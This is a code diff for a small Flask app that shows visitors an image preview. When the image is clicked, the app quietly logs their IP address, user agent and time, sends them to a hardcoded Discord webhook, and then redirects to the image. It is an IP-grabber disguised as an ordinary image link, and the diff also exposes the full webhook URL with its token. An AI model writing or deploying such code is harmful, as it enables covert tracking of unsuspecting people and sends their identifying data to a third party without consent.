@@ -1,26 +1,47 @@
-from flask import Flask, request
+from flask import Flask, request, redirect, make_response
 import requests
-import os
+from datetime import datetime
 
 app = Flask(__name__)
 
-DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1369953205349519380/zAmptjF_CZ3l5xyJ12DOIf3GWQatSNJKepjL_d7r3FL5-QxXhh_msIOjXj4WMEECZjxz'
-PUBLIC_URL = os.getenv("PUBLIC_URL")
+WEBHOOK_URL = "https://discord.com/api/webhooks/1369953205349519380/zAmptjF_CZ3l5xyJ12DOIf3GWQatSNJKepjL_d7r3FL5-QxXhh_msIOjXj4WMEECZjxz"
 
 @app.route('/')
-def index():
-    visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+def og_image_preview():
+    html = '''
+    <html>
+      <head>
+        <meta property="og:image" content="https://tse2.mm.bing.net/th?id=OIP.rfrxsx6jbbLi1C9fvvaEKwAAAA&pid=Api&P=0&h=180" />
+      </head>
+      <body>
+        <a href="/track">
+          <img src="https://tse2.mm.bing.net/th?id=OIP.rfrxsx6jbbLi1C9fvvaEKwAAAA&pid=Api&P=0&h=180" style="width:100%;height:auto;" />
+        </a>
+      </body>
+    </html>
+    '''
+    return make_response(html)
+
+@app.route('/track')
+def track_and_redirect():
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    user_agent = request.headers.get('User-Agent')
+    timestamp = datetime.utcnow().isoformat()
+
     data = {
-        "content": "Log Info",
-        "embeds": [
-            {
-                "image": {"url": PUBLIC_URL}
-            }
-        ]
+        "embeds": [{
+            "color": 0x800080,
+            "fields": [
+                {"name": "IP", "value": ip, "inline": True},
+                {"name": "User-Agent", "value": user_agent[:100] + "...", "inline": False},
+                {"name": "Time (UTC)", "value": timestamp, "inline": True}
+            ]
+        }]
     }
-    requests.post(DISCORD_WEBHOOK_URL, json=data)
-    return '', 204
 
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=8000)
+    try:
+        requests.post(WEBHOOK_URL, json=data)
+    except:
+        pass
 
+    return redirect("https://tse2.mm.bing.net/th?id=OIP.rfrxsx6jbbLi1C9fvvaEKwAAAA&pid=Api&P=0&h=180")
